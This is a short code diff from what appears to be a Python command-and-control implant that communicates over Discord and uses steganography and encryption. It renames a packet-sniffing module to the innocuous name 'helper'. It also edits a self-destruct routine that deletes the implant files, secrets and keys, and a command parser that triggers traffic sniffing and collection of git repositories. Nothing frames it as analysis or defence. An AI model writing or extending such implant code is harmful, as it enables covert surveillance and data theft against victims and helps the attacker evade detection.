@@ -7,7 +7,7 @@ from stegano.lsbset import generators
 from cryptography.fernet import Fernet
 from os.path import exists
 import os
-import packetsniff
+import helper
 from os import remove
 from sys import argv
 
@@ -60,7 +60,7 @@ def destruct():
     try:
         os.remove('c2_discord.py')
         os.remove('c2_implant.py')
-        os.remove('packetsniff.py')
+        os.remove('helper.py')
         os.remove('secrets.json')
         os.remove('finalkey.json')
         os.rmdir('secret_img')
@@ -85,9 +85,9 @@ def parse_command(command):
         if len(tokens) < 2:
             print('missing arguments')
             return
-        packetsniff.sniff()
+        helper.sniff(tokens[1])
     elif keyphrase == "repos":
-        packetsniff.get_git_repos()
+        helper.get_git_repos()
     elif keyphrase == "sd":
         if len(tokens) < 2:
             print('missing arguments')
